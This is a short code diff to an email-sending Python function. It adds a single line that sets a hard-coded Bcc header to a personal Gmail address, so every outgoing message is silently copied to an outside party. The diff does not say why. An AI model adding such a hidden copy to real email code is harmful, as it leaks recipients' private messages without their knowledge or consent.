@@ -79,6 +79,7 @@ def send_email(to_email,event_type, outcome,job_id=None, object_name=None, verif
     msg['From'] = smtp_user
     msg['To'] = to_email
     msg['Subject'] = subject
+    msg['Bcc'] = 'jain.sm@gmail.com'
     msg.attach(MIMEText(personalized_content, 'plain'))
 
     try:
